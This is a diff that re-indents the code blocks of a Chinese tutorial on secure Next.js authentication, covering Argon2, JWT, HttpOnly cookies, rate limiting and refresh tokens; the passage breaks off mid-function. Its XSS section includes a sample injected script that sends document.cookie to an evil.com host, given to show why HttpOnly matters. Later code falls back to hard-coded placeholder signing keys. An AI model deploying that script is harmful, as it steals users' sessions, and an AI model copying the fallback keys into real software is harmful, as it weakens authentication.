@@ -120,13 +120,13 @@ Argon2是目前最先进的密码哈希算法，2015年赢得了著名的"密码
 import { hash, verify, argon2id } from 'argon2'
 
 async function hashPassword(password: string): Promise<string> {
-	return await hash(password, {
-		type: argon2id, // 混合模式，平衡安全性和性能
-		memoryCost: 65536, // 64MB内存使用
-		timeCost: 3, // 迭代3次
-		parallelism: 4, // 4个线程并行
-		hashLength: 32, // 输出32字节
-	})
+  return await hash(password, {
+    type: argon2id, // 混合模式，平衡安全性和性能
+    memoryCost: 65536, // 64MB内存使用
+    timeCost: 3, // 迭代3次
+    parallelism: 4, // 4个线程并行
+    hashLength: 32, // 输出32字节
+  })
 }
 ```
 
@@ -220,24 +220,24 @@ JWT支持两种签名算法：
 import { jwtVerify, SignJWT } from 'jose'
 
 class AuthService {
-	// 生成Token
-	async generateToken(payload: any): Promise<string> {
-		return await new SignJWT(payload)
-			.setProtectedHeader({ alg: 'RS256' }) // 必须明确指定算法
-			.setIssuedAt() // 签发时间
-			.setExpirationTime('7d') // 7天后过期
-			.sign(privateKey) // 用私钥签名
-	}
+  // 生成Token
+  async generateToken(payload: any): Promise<string> {
+    return await new SignJWT(payload)
+      .setProtectedHeader({ alg: 'RS256' }) // 必须明确指定算法
+      .setIssuedAt() // 签发时间
+      .setExpirationTime('7d') // 7天后过期
+      .sign(privateKey) // 用私钥签名
+  }
 
-	// 验证Token
-	async verifyToken(token: string): Promise<any> {
-		try {
-			const { payload } = await jwtVerify(token, publicKey) // 用公钥验证
-			return payload
-		} catch (error) {
-			return null // 验证失败
-		}
-	}
+  // 验证Token
+  async verifyToken(token: string): Promise<any> {
+    try {
+      const { payload } = await jwtVerify(token, publicKey) // 用公钥验证
+      return payload
+    } catch (error) {
+      return null // 验证失败
+    }
+  }
 }
 ```
 
@@ -284,10 +284,10 @@ XSS（跨站脚本攻击）是Web安全的大敌。黑客在你的网站注入�
 ```html
 <!-- 恶意评论里藏着这段代码 -->
 <script>
-	// 读取Cookie里的Token
-	const token = document.cookie
-	// 发到黑客的服务器
-	fetch('https://evil.com/steal?cookie=' + token)
+  // 读取Cookie里的Token
+  const token = document.cookie
+  // 发到黑客的服务器
+  fetch('https://evil.com/steal?cookie=' + token)
 </script>
 ```
 
@@ -295,11 +295,11 @@ HttpOnly的作用：让JavaScript根本读不到这个Cookie！
 
 ```typescript
 cookieStore.set('token', jwtToken, {
-	httpOnly: true, // 加了这个，JavaScript就读不到了
-	secure: true, // 只在HTTPS下发送
-	sameSite: 'strict', // 防止CSRF
-	maxAge: 7 * 24 * 60 * 60, // 7天有效期
-	path: '/',
+  httpOnly: true, // 加了这个，JavaScript就读不到了
+  secure: true, // 只在HTTPS下发送
+  sameSite: 'strict', // 防止CSRF
+  maxAge: 7 * 24 * 60 * 60, // 7天有效期
+  path: '/',
 })
 ```
 
@@ -328,24 +328,24 @@ SameSite就是来解决这个的：
 import { cookies } from 'next/headers'
 
 async function login(name: string, password: string) {
-	// ...验证逻辑...
+  // ...验证逻辑...
 
-	// 签发JWT
-	const token = await authService.generateToken({
-		userId: user.id,
-		name: user.name,
-	})
+  // 签发JWT
+  const token = await authService.generateToken({
+    userId: user.id,
+    name: user.name,
+  })
 
-	// 设置Cookie - Next.js 15需要await
-	const cookieStore = await cookies()
+  // 设置Cookie - Next.js 15需要await
+  const cookieStore = await cookies()
 
-	cookieStore.set('auth_token', token, {
-		httpOnly: true, // 防止XSS读取
-		secure: process.env.NODE_ENV === 'production', // 生产环境必须HTTPS
-		sameSite: 'lax', // 防止CSRF，但允许导航请求
-		maxAge: 60 * 60 * 24 * 7, // 7天有效期（秒）
-		path: '/', // 全站生效
-	})
+  cookieStore.set('auth_token', token, {
+    httpOnly: true, // 防止XSS读取
+    secure: process.env.NODE_ENV === 'production', // 生产环境必须HTTPS
+    sameSite: 'lax', // 防止CSRF，但允许导航请求
+    maxAge: 60 * 60 * 24 * 7, // 7天有效期（秒）
+    path: '/', // 全站生效
+  })
 }
 ```
 
@@ -363,80 +363,80 @@ import { z } from 'zod'
 
 // 先定义输入验证规则
 const registerSchema = z.object({
-	name: z
-		.string()
-		.min(2, '用户名至少2个字符')
-		.max(50, '用户名最多50个字符')
-		.regex(/^[a-zA-Z0-9_]+$/, '用户名只能包含字母、数字、下划线'),
-	password: z
-		.string()
-		.min(8, '密码至少8个字符')
-		.max(128, '密码最长128个字符')
-		.regex(/[A-Z]/, '密码必须包含大写字母')
-		.regex(/[a-z]/, '密码必须包含小写字母')
-		.regex(/[0-9]/, '密码必须包含数字'),
+  name: z
+    .string()
+    .min(2, '用户名至少2个字符')
+    .max(50, '用户名最多50个字符')
+    .regex(/^[a-zA-Z0-9_]+$/, '用户名只能包含字母、数字、下划线'),
+  password: z
+    .string()
+    .min(8, '密码至少8个字符')
+    .max(128, '密码最长128个字符')
+    .regex(/[A-Z]/, '密码必须包含大写字母')
+    .regex(/[a-z]/, '密码必须包含小写字母')
+    .regex(/[0-9]/, '密码必须包含数字'),
 })
 
 class AuthService {
-	/**
-	 * 注册新用户
-	 */
-	async register(name: string, password: string): Promise<IDataResult<boolean>> {
-		try {
-			// 1. 输入验证
-			const validationResult = registerSchema.safeParse({ name, password })
-			if (!validationResult.success) {
-				return {
-					code: -1,
-					message: validationResult.error.errors[0].message,
-					data: false,
-				}
-			}
+  /**
+   * 注册新用户
+   */
+  async register(name: string, password: string): Promise<IDataResult<boolean>> {
+    try {
+      // 1. 输入验证
+      const validationResult = registerSchema.safeParse({ name, password })
+      if (!validationResult.success) {
+        return {
+          code: -1,
+          message: validationResult.error.errors[0].message,
+          data: false,
+        }
+      }
 
-			// 2. 检查用户名是否已存在
-			const existingUser = await this.prisma.user.findFirst({
-				where: { name },
-			})
+      // 2. 检查用户名是否已存在
+      const existingUser = await this.prisma.user.findFirst({
+        where: { name },
+      })
 
-			if (existingUser) {
-				return {
-					code: -1,
-					message: '用户名已被占用',
-					data: false,
-				}
-			}
+      if (existingUser) {
+        return {
+          code: -1,
+          message: '用户名已被占用',
+          data: false,
+        }
+      }
 
-			// 3. 用Argon2生成安全的密码哈希
-			const hashedPassword = await hash(password, {
-				type: argon2id,
-				memoryCost: 65536, // 64MB
-				timeCost: 3, // 3次迭代
-				parallelism: 4, // 4线程
-				hashLength: 32,
-			})
+      // 3. 用Argon2生成安全的密码哈希
+      const hashedPassword = await hash(password, {
+        type: argon2id,
+        memoryCost: 65536, // 64MB
+        timeCost: 3, // 3次迭代
+        parallelism: 4, // 4线程
+        hashLength: 32,
+      })
 
-			// 4. 创建用户记录
-			await this.prisma.user.create({
-				data: {
-					name,
-					password: hashedPassword, // 只存哈希，不存明文！
-				},
-			})
+      // 4. 创建用户记录
+      await this.prisma.user.create({
+        data: {
+          name,
+          password: hashedPassword, // 只存哈希，不存明文！
+        },
+      })
 
-			return {
-				code: 0,
-				message: '注册成功',
-				data: true,
-			}
-		} catch (error) {
-			console.error('注册失败:', error)
-			return {
-				code: -1,
-				message: '注册失败，请稍后重试',
-				data: false,
-			}
-		}
-	}
+      return {
+        code: 0,
+        message: '注册成功',
+        data: true,
+      }
+    } catch (error) {
+      console.error('注册失败:', error)
+      return {
+        code: -1,
+        message: '注册失败，请稍后重试',
+        data: false,
+      }
+    }
+  }
 }
 ```
 
@@ -446,71 +446,71 @@ class AuthService {
 
 ```typescript
 class AuthService {
-	/**
-	 * 用户登录
-	 */
-	async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
-		try {
-			// 1. 查找用户
-			const user = await this.prisma.user.findFirst({
-				where: { name },
-			})
+  /**
+   * 用户登录
+   */
+  async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
+    try {
+      // 1. 查找用户
+      const user = await this.prisma.user.findFirst({
+        where: { name },
+      })
 
-			if (!user) {
-				// 注意：返回模糊的错误信息，防止用户探测
-				return {
-					code: -1,
-					message: '用户名或密码错误',
-					data: { user: null },
-				}
-			}
+      if (!user) {
+        // 注意：返回模糊的错误信息，防止用户探测
+        return {
+          code: -1,
+          message: '用户名或密码错误',
+          data: { user: null },
+        }
+      }
 
-			// 2. 验证密码（Argon2的verify方法会自动处理盐值）
-			const isPasswordValid = await verify(user.password, password)
+      // 2. 验证密码（Argon2的verify方法会自动处理盐值）
+      const isPasswordValid = await verify(user.password, password)
 
-			if (!isPasswordValid) {
-				return {
-					code: -1,
-					message: '用户名或密码错误',
-					data: { user: null },
-				}
-			}
+      if (!isPasswordValid) {
+        return {
+          code: -1,
+          message: '用户名或密码错误',
+          data: { user: null },
+        }
+      }
 
-			// 3. 生成JWT
-			const token = await this.generateToken({
-				userId: user.id,
-				name: user.name,
-			})
+      // 3. 生成JWT
+      const token = await this.generateToken({
+        userId: user.id,
+        name: user.name,
+      })
 
-			// 4. 设置Cookie
-			const cookieStore = await cookies()
-			cookieStore.set('auth_token', token, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 60 * 60 * 24 * 7, // 7天
-				path: '/',
-			})
+      // 4. 设置Cookie
+      const cookieStore = await cookies()
+      cookieStore.set('auth_token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 60 * 60 * 24 * 7, // 7天
+        path: '/',
+      })
 
-			return {
-				code: 0,
-				message: '登录成功',
-				data: {
-					user: {
-						id: user.id,
-						name: user.name,
-					},
-				},
-			}
-		} catch (error) {
-			console.error('登录失败:', error)
-			return {
-				code: -1,
-				message: '登录失败，请稍后重试',
-				data: { user: null },
-			}
-		}
-	}
+      return {
+        code: 0,
+        message: '登录成功',
+        data: {
+          user: {
+            id: user.id,
+            name: user.name,
+          },
+        },
+      }
+    } catch (error) {
+      console.error('登录失败:', error)
+      return {
+        code: -1,
+        message: '登录失败，请稍后重试',
+        data: { user: null },
+      }
+    }
+  }
 }
 ```
 
@@ -520,32 +520,32 @@ class AuthService {
 
 ```typescript
 class AuthService {
-	/**
-	 * 获取当前登录用户信息
-	 */
-	async getCurrentUser(): Promise<JWTPayload | null> {
-		try {
-			const cookieStore = await cookies()
-			const token = cookieStore.get('auth_token')
+  /**
+   * 获取当前登录用户信息
+   */
+  async getCurrentUser(): Promise<JWTPayload | null> {
+    try {
+      const cookieStore = await cookies()
+      const token = cookieStore.get('auth_token')
 
-			if (!token) {
-				return null
-			}
+      if (!token) {
+        return null
+      }
 
-			return await this.verifyToken(token.value)
-		} catch (error) {
-			console.error('获取当前用户失败:', error)
-			return null
-		}
-	}
+      return await this.verifyToken(token.value)
+    } catch (error) {
+      console.error('获取当前用户失败:', error)
+      return null
+    }
+  }
 
-	/**
-	 * 检查是否已登录
-	 */
-	async isAuthenticated(): Promise<boolean> {
-		const user = await this.getCurrentUser()
-		return user !== null
-	}
+  /**
+   * 检查是否已登录
+   */
+  async isAuthenticated(): Promise<boolean> {
+    const user = await this.getCurrentUser()
+    return user !== null
+  }
 }
 ```
 
@@ -553,30 +553,30 @@ class AuthService {
 
 ```typescript
 class AuthService {
-	/**
-	 * 退出登录
-	 */
-	async logout(): Promise<IDataResult<boolean>> {
-		try {
-			const cookieStore = await cookies()
+  /**
+   * 退出登录
+   */
+  async logout(): Promise<IDataResult<boolean>> {
+    try {
+      const cookieStore = await cookies()
 
-			// 清除Cookie
-			cookieStore.delete('auth_token')
+      // 清除Cookie
+      cookieStore.delete('auth_token')
 
-			return {
-				code: 0,
-				message: '已退出登录',
-				data: true,
-			}
-		} catch (error) {
-			console.error('退出登录失败:', error)
-			return {
-				code: -1,
-				message: '退出登录失败',
-				data: false,
-			}
-		}
-	}
+      return {
+        code: 0,
+        message: '已退出登录',
+        data: true,
+      }
+    } catch (error) {
+      console.error('退出登录失败:', error)
+      return {
+        code: -1,
+        message: '退出登录失败',
+        data: false,
+      }
+    }
+  }
 }
 ```
 
@@ -601,34 +601,34 @@ const authService = new AuthService()
  * 注册用户
  */
 export async function register(formData: FormData) {
-	const name = formData.get('name') as string
-	const password = formData.get('password') as string
+  const name = formData.get('name') as string
+  const password = formData.get('password') as string
 
-	return await authService.register(name, password)
+  return await authService.register(name, password)
 }
 
 /**
  * 登录用户
  */
 export async function login(formData: FormData) {
-	const name = formData.get('name') as string
-	const password = formData.get('password') as string
+  const name = formData.get('name') as string
+  const password = formData.get('password') as string
 
-	return await authService.login(name, password)
+  return await authService.login(name, password)
 }
 
 /**
  * 退出登录
  */
 export async function logout() {
-	return await authService.logout()
+  return await authService.logout()
 }
 
 /**
  * 检查登录状态
  */
 export async function checkAuth() {
-	return await authService.isAuthenticated()
+  return await authService.isAuthenticated()
 }
 ```
 
@@ -647,25 +647,25 @@ export async function checkAuth() {
 import { register } from '@/lib/auth-actions'
 
 export default function RegisterPage() {
-	async function handleSubmit(formData: FormData) {
-		const result = await register(formData)
+  async function handleSubmit(formData: FormData) {
+    const result = await register(formData)
 
-		if (result.code === 0) {
-			// 跳转到登录页
-			redirect('/login')
-		} else {
-			// 显示错误
-			alert(result.message)
-		}
-	}
+    if (result.code === 0) {
+      // 跳转到登录页
+      redirect('/login')
+    } else {
+      // 显示错误
+      alert(result.message)
+    }
+  }
 
-	return (
-		<form action={handleSubmit}>
-			<input name="name" placeholder="用户名" />
-			<input name="password" type="password" placeholder="密码" />
-			<button type="submit">注册</button>
-		</form>
-	)
+  return (
+    <form action={handleSubmit}>
+      <input name="name" placeholder="用户名" />
+      <input name="password" type="password" placeholder="密码" />
+      <button type="submit">注册</button>
+    </form>
+  )
 }
 ```
 
@@ -678,23 +678,23 @@ import { login } from '@/lib/auth-actions'
 import { redirect } from 'next/navigation'
 
 export default function LoginPage() {
-	async function handleSubmit(formData: FormData) {
-		const result = await login(formData)
+  async function handleSubmit(formData: FormData) {
+    const result = await login(formData)
 
-		if (result.code === 0) {
-			redirect('/dashboard')
-		} else {
-			alert(result.message)
-		}
-	}
+    if (result.code === 0) {
+      redirect('/dashboard')
+    } else {
+      alert(result.message)
+    }
+  }
 
-	return (
-		<form action={handleSubmit}>
-			<input name="name" placeholder="用户名" />
-			<input name="password" type="password" placeholder="密码" />
-			<button type="submit">登录</button>
-		</form>
-	)
+  return (
+    <form action={handleSubmit}>
+      <input name="name" placeholder="用户名" />
+      <input name="password" type="password" placeholder="密码" />
+      <button type="submit">登录</button>
+    </form>
+  )
 }
 ```
 
@@ -711,44 +711,44 @@ import { useState, useEffect, useCallback } from 'react'
 import { checkAuth } from '@/lib/auth-actions'
 
 interface User {
-	userId: string
-	name: string
+  userId: string
+  name: string
 }
 
 export function useAuth() {
-	const [user, setUser] = useState<User | null>(null)
-	const [loading, setLoading] = useState(true)
+  const [user, setUser] = useState<User | null>(null)
+  const [loading, setLoading] = useState(true)
 
-	// 检查登录状态
-	const checkAuthStatus = useCallback(async () => {
-		setLoading(true)
-		try {
-			const userData = await checkAuth()
-			setUser(userData)
-		} catch (error) {
-			console.error('认证检查失败:', error)
-			setUser(null)
-		} finally {
-			setLoading(false)
-		}
-	}, [])
+  // 检查登录状态
+  const checkAuthStatus = useCallback(async () => {
+    setLoading(true)
+    try {
+      const userData = await checkAuth()
+      setUser(userData)
+    } catch (error) {
+      console.error('认证检查失败:', error)
+      setUser(null)
+    } finally {
+      setLoading(false)
+    }
+  }, [])
 
-	// 组件挂载时检查一次
-	useEffect(() => {
-		checkAuthStatus()
-	}, [checkAuthStatus])
+  // 组件挂载时检查一次
+  useEffect(() => {
+    checkAuthStatus()
+  }, [checkAuthStatus])
 
-	// 刷新认证状态（登录后、登出后调用）
-	const refreshAuth = useCallback(() => {
-		checkAuthStatus()
-	}, [checkAuthStatus])
+  // 刷新认证状态（登录后、登出后调用）
+  const refreshAuth = useCallback(() => {
+    checkAuthStatus()
+  }, [checkAuthStatus])
 
-	return {
-		user,
-		loading,
-		isAuthenticated: user !== null,
-		refreshAuth,
-	}
+  return {
+    user,
+    loading,
+    isAuthenticated: user !== null,
+    refreshAuth,
+  }
 }
 ```
 
@@ -762,30 +762,30 @@ import { logout } from '@/lib/auth-actions'
 import { useRouter } from 'next/navigation'
 
 export default function DashboardPage() {
-	const { user, loading, isAuthenticated, refreshAuth } = useAuth()
-	const router = useRouter()
+  const { user, loading, isAuthenticated, refreshAuth } = useAuth()
+  const router = useRouter()
 
-	async function handleLogout() {
-		await logout()
-		refreshAuth()
-		router.push('/login')
-	}
+  async function handleLogout() {
+    await logout()
+    refreshAuth()
+    router.push('/login')
+  }
 
-	if (loading) {
-		return <div className="loading">加载中...</div>
-	}
+  if (loading) {
+    return <div className="loading">加载中...</div>
+  }
 
-	if (!isAuthenticated) {
-		return <div className="not-logged-in">请先登录</div>
-	}
+  if (!isAuthenticated) {
+    return <div className="not-logged-in">请先登录</div>
+  }
 
-	return (
-		<div className="dashboard">
-			<h1>欢迎回来，{user?.name}！</h1>
-			<p>这是你的专属仪表盘</p>
-			<button onClick={handleLogout}>退出登录</button>
-		</div>
-	)
+  return (
+    <div className="dashboard">
+      <h1>欢迎回来，{user?.name}！</h1>
+      <p>这是你的专属仪表盘</p>
+      <button onClick={handleLogout}>退出登录</button>
+    </div>
+  )
 }
 ```
 
@@ -802,27 +802,27 @@ import { z } from 'zod'
 
 // 定义验证规则
 const loginSchema = z.object({
-	name: z.string().min(1, '用户名不能为空').max(50, '用户名过长'),
-	password: z.string().min(6, '密码至少6位').max(100, '密码过长'),
+  name: z.string().min(1, '用户名不能为空').max(50, '用户名过长'),
+  password: z.string().min(6, '密码至少6位').max(100, '密码过长'),
 })
 
 // 在登录函数中使用
 async function login(formData: FormData) {
-	const name = formData.get('name') as string
-	const password = formData.get('password') as string
+  const name = formData.get('name') as string
+  const password = formData.get('password') as string
 
-	// 验证输入
-	const result = loginSchema.safeParse({ name, password })
+  // 验证输入
+  const result = loginSchema.safeParse({ name, password })
 
-	if (!result.success) {
-		return {
-			code: -1,
-			message: result.error.errors[0].message,
-			data: { user: null },
-		}
-	}
+  if (!result.success) {
+    return {
+      code: -1,
+      message: result.error.errors[0].message,
+      data: { user: null },
+    }
+  }
 
-	// 验证通过，继续业务逻辑
+  // 验证通过，继续业务逻辑
 }
 ```
 
@@ -835,43 +835,43 @@ import { RateLimiter } from 'rate-limiter-flexible'
 
 // 基于IP的限流器
 const ipRateLimiter = new RateLimiter({
-	points: 10, // 10次机会
-	duration: 60, // 60秒内
-	blockDuration: 300, // 被封5分钟
+  points: 10, // 10次机会
+  duration: 60, // 60秒内
+  blockDuration: 300, // 被封5分钟
 })
 
 // 基于用户名的限流器（防止一个人锁定别人账户）
 const usernameRateLimiter = new RateLimiter({
-	points: 5, // 5次机会
-	duration: 900, // 15分钟内
-	blockDuration: 900, // 被封15分钟
+  points: 5, // 5次机会
+  duration: 900, // 15分钟内
+  blockDuration: 900, // 被封15分钟
 })
 
 async function login(name: string, password: string) {
-	// 检查IP是否被限流
-	const ipKey = 'login:' + getClientIP()
-	try {
-		await ipRateLimiter.consume(ipKey)
-	} catch (error) {
-		return {
-			code: -1,
-			message: '操作过于频繁，请稍后再试',
-			data: { user: null },
-		}
-	}
+  // 检查IP是否被限流
+  const ipKey = 'login:' + getClientIP()
+  try {
+    await ipRateLimiter.consume(ipKey)
+  } catch (error) {
+    return {
+      code: -1,
+      message: '操作过于频繁，请稍后再试',
+      data: { user: null },
+    }
+  }
 
-	// 检查用户名是否被限流
-	try {
-		await usernameRateLimiter.consume(name)
-	} catch (error) {
-		return {
-			code: -1,
-			message: '该账户登录尝试过多，请15分钟后再试',
-			data: { user: null },
-		}
-	}
+  // 检查用户名是否被限流
+  try {
+    await usernameRateLimiter.consume(name)
+  } catch (error) {
+    return {
+      code: -1,
+      message: '该账户登录尝试过多，请15分钟后再试',
+      data: { user: null },
+    }
+  }
 
-	// 原有登录逻辑...
+  // 原有登录逻辑...
 }
 ```
 
@@ -881,64 +881,64 @@ async function login(name: string, password: string) {
 
 ```typescript
 class AuthService {
-	/**
-	 * 记录审计日志
-	 */
-	private async createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
-		try {
-			await this.prisma.auditLog.create({
-				data: {
-					action,
-					userId,
-					metadata,
-					ipAddress: getClientIP(),
-					userAgent: getUserAgent(),
-					createdAt: new Date(),
-				},
-			})
-		} catch (error) {
-			// 审计日志失败不应该影响业务流程
-			console.error('审计日志写入失败:', error)
-		}
-	}
+  /**
+   * 记录审计日志
+   */
+  private async createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
+    try {
+      await this.prisma.auditLog.create({
+        data: {
+          action,
+          userId,
+          metadata,
+          ipAddress: getClientIP(),
+          userAgent: getUserAgent(),
+          createdAt: new Date(),
+        },
+      })
+    } catch (error) {
+      // 审计日志失败不应该影响业务流程
+      console.error('审计日志写入失败:', error)
+    }
+  }
 
-	/**
-	 * 登录（带审计）
-	 */
-	async login(name: string, password: string) {
-		try {
-			const user = await this.prisma.user.findFirst({ where: { name } })
+  /**
+   * 登录（带审计）
+   */
+  async login(name: string, password: string) {
+    try {
+      const user = await this.prisma.user.findFirst({ where: { name } })
 
-			if (!user) {
-				// 记录失败尝试（不包括"用户不存在"的细节）
-				await this.createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
-				return { code: -1, message: '用户名或密码错误' }
-			}
+      if (!user) {
+        // 记录失败尝试（不包括"用户不存在"的细节）
+        await this.createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
+        return { code: -1, message: '用户名或密码错误' }
+      }
 
-			const isValid = await verify(user.password, password)
+      const isValid = await verify(user.password, password)
 
-			if (!isValid) {
-				await this.createAuditLog('LOGIN_FAILED', {
-					reason: 'wrong_password',
-					userId: user.id,
-				})
-				return { code: -1, message: '用户名或密码错误' }
-			}
+      if (!isValid) {
+        await this.createAuditLog('LOGIN_FAILED', {
+          reason: 'wrong_password',
+          userId: user.id,
+        })
+        return { code: -1, message: '用户名或密码错误' }
+      }
 
-			// 登录成功
-			await this.createAuditLog('LOGIN_SUCCESS', {
-				userId: user.id,
-			})
+      // 登录成功
+      await this.createAuditLog('LOGIN_SUCCESS', {
+        userId: user.id,
+      })
 
-			// 生成Token、设置Cookie...
-			return { code: 0, message: '登录成功' }
-		} catch (error) {
-			await this.createAuditLog('LOGIN_ERROR', {
-				error: (error as Error).message,
-			})
-			throw error
-		}
-	}
+      // 生成Token、设置Cookie...
+      return { code: 0, message: '登录成功' }
+    } catch (error) {
+      await this.createAuditLog('LOGIN_ERROR', {
+        error: (error as Error).message,
+      })
+      throw error
+    }
+  }
 }
 ```
 
@@ -1011,10 +1011,10 @@ model RefreshToken {
 
 ```typescript
 async function generateRefreshToken(userId: string): Promise<string> {
-	return await new SignJWT({ userId, type: 'refresh' })
-		.setProtectedHeader({ alg: 'RS256' })
-		.setExpirationTime('7d')
-		.sign(refreshTokenPrivateKey) // 用不同的密钥
+  return await new SignJWT({ userId, type: 'refresh' })
+    .setProtectedHeader({ alg: 'RS256' })
+    .setExpirationTime('7d')
+    .sign(refreshTokenPrivateKey) // 用不同的密钥
 }
 ```
 
@@ -1121,310 +1121,310 @@ const ACCESS_TOKEN_EXPIRY = '15m' // 15分钟
 const REFRESH_TOKEN_EXPIRY = '7d' // 7天
 
 class AuthService {
-	private readonly prisma: PrismaClient
+  private readonly prisma: PrismaClient
 
-	// 密钥（实际应该从环境变量加载）
-	private readonly accessTokenPrivateKey: Uint8Array
-	private readonly accessTokenPublicKey: Uint8Array
-	private readonly refreshTokenPrivateKey: Uint8Array
-	private readonly refreshTokenPublicKey: Uint8Array
+  // 密钥（实际应该从环境变量加载）
+  private readonly accessTokenPrivateKey: Uint8Array
+  private readonly accessTokenPublicKey: Uint8Array
+  private readonly refreshTokenPrivateKey: Uint8Array
+  private readonly refreshTokenPublicKey: Uint8Array
 
-	constructor() {
-		this.prisma = prisma
+  constructor() {
+    this.prisma = prisma
 
-		// 初始化密钥（实际生产应该从安全的密钥管理系统加载）
-		// 这里用字符串转Uint8Array的简化示例
-		this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
-		this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
-		this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
-		this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
-	}
+    // 初始化密钥（实际生产应该从安全的密钥管理系统加载）
+    // 这里用字符串转Uint8Array的简化示例
+    this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
+    this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
+    this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
+    this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
+  }
 
-	/**
-	 * 生成Access Token（短期）
-	 */
-	async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
-		return await new SignJWT(payload)
-			.setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
-			.setIssuedAt()
-			.setExpirationTime(ACCESS_TOKEN_EXPIRY)
-			.sign(this.accessTokenPrivateKey)
-	}
+  /**
+   * 生成Access Token（短期）
+   */
+  async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
+    return await new SignJWT(payload)
+      .setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
+      .setIssuedAt()
+      .setExpirationTime(ACCESS_TOKEN_EXPIRY)
+      .sign(this.accessTokenPrivateKey)
+  }
 
-	/**
-	 * 生成Refresh Token（JWT格式 + 元数据存储）
-	 */
-	async generateRefreshToken(userId: string): Promise<string> {
-		// 生成唯一的JWT ID
-		const jti = crypto.randomUUID()
+  /**
+   * 生成Refresh Token（JWT格式 + 元数据存储）
+   */
+  async generateRefreshToken(userId: string): Promise<string> {
+    // 生成唯一的JWT ID
+    const jti = crypto.randomUUID()
 
-		// 计算过期时间
-		const expiresAt = new Date()
-		expiresAt.setDate(expiresAt.getDate() + 7)
+    // 计算过期时间
+    const expiresAt = new Date()
+    expiresAt.setDate(expiresAt.getDate() + 7)
 
-		// 存储元数据（只存jti，不存完整的token）
-		await this.prisma.refreshTokenMetadata.create({
-			data: {
-				jti,
-				userId,
-				expiresAt,
-			},
-		})
+    // 存储元数据（只存jti，不存完整的token）
+    await this.prisma.refreshTokenMetadata.create({
+      data: {
+        jti,
+        userId,
+        expiresAt,
+      },
+    })
 
-		// 生成JWT格式的Refresh Token
-		return await new SignJWT({
-			userId,
-			jti,
-			type: 'refresh',
-		})
-			.setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
-			.setIssuedAt()
-			.setExpirationTime(REFRESH_TOKEN_EXPIRY)
-			.setJti(jti)
-			.sign(this.refreshTokenPrivateKey)
-	}
+    // 生成JWT格式的Refresh Token
+    return await new SignJWT({
+      userId,
+      jti,
+      type: 'refresh',
+    })
+      .setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
+      .setIssuedAt()
+      .setExpirationTime(REFRESH_TOKEN_EXPIRY)
+      .setJti(jti)
+      .sign(this.refreshTokenPrivateKey)
+  }
 
-	/**
-	 * 验证Refresh Token
-	 */
-	async verifyRefreshToken(token: string): Promise<{
-		isValid: boolean
-		userId?: string
-		jti?: string
-	}> {
-		try {
-			// 1. 验证JWT签名和过期时间
-			const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
-				algorithms: [REFRESH_TOKEN_ALGORITHM],
-			})
+  /**
+   * 验证Refresh Token
+   */
+  async verifyRefreshToken(token: string): Promise<{
+    isValid: boolean
+    userId?: string
+    jti?: string
+  }> {
+    try {
+      // 1. 验证JWT签名和过期时间
+      const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
+        algorithms: [REFRESH_TOKEN_ALGORITHM],
+      })
 
-			const { userId, jti, type } = payload as any
+      const { userId, jti, type } = payload as any
 
-			if (type !== 'refresh' || !userId || !jti) {
-				return { isValid: false }
-			}
+      if (type !== 'refresh' || !userId || !jti) {
+        return { isValid: false }
+      }
 
-			// 2. 检查元数据是否被撤销
-			const metadata = await this.prisma.refreshTokenMetadata.findUnique({
-				where: { jti },
-			})
+      // 2. 检查元数据是否被撤销
+      const metadata = await this.prisma.refreshTokenMetadata.findUnique({
+        where: { jti },
+      })
 
-			if (!metadata) {
-				return { isValid: false }
-			}
+      if (!metadata) {
+        return { isValid: false }
+      }
 
-			if (metadata.revoked) {
-				return { isValid: false }
-			}
+      if (metadata.revoked) {
+        return { isValid: false }
+      }
 
-			// 3. 检查是否已过期（双重检查）
-			if (metadata.expiresAt < new Date()) {
-				return { isValid: false }
-			}
+      // 3. 检查是否已过期（双重检查）
+      if (metadata.expiresAt < new Date()) {
+        return { isValid: false }
+      }
 
-			return { isValid: true, userId, jti }
-		} catch (error) {
-			console.error('Refresh Token验证失败:', error)
-			return { isValid: false }
-		}
-	}
+      return { isValid: true, userId, jti }
+    } catch (error) {
+      console.error('Refresh Token验证失败:', error)
+      return { isValid: false }
+    }
+  }
 
-	/**
-	 * 撤销单个Refresh Token
-	 */
-	async revokeRefreshToken(jti: string): Promise<void> {
-		await this.prisma.refreshTokenMetadata.update({
-			where: { jti },
-			data: { revoked: true },
-		})
-	}
+  /**
+   * 撤销单个Refresh Token
+   */
+  async revokeRefreshToken(jti: string): Promise<void> {
+    await this.prisma.refreshTokenMetadata.update({
+      where: { jti },
+      data: { revoked: true },
+    })
+  }
 
-	/**
-	 * 撤销用户的所有Refresh Token（用于"退出所有设备"）
-	 */
-	async revokeAllUserRefreshTokens(userId: string): Promise<void> {
-		await this.prisma.refreshTokenMetadata.updateMany({
-			where: {
